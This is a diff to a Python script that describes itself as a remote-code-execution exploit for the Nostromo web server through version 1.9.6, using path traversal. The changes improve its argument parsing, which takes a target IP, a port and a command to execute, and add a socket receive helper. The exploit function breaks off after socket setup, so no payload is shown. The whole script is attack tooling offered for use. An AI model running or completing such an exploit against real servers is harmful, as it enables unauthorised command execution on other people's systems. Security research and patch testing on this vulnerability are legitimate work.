@@ -1,13 +1,25 @@
+#!/usr/bin/env python
+
 import socket
 import argparse
 
-parser = argparse.ArgumentParser(description='RCE in Nostromo')
-parser.add_argument('IP',help="IP server")
+parser = argparse.ArgumentParser(description='RCE in Nostromo web server through 1.9.6 due to path traversal.')
+parser.add_argument('IP',help='domain/IP of the Nostromo web server')
 parser.add_argument('port',help='port number',type=int)
-parser.add_argument('bash',help='command to execute, default is id',default='id',args='')
+parser.add_argument('bash',help='command to execute, default is id',default='id',nargs='?')
 args = parser.parse_args()
 
-
+def recv(s):
+    r=''
+    try:
+        while True:
+            t=s.recv(1024)
+            if len(t)==0:
+                break
+            r+=t
+    except:
+        pass
+    return r
 def exploit(IP,port,bash):
     s=socket.socket()
     s.settimeout(1)
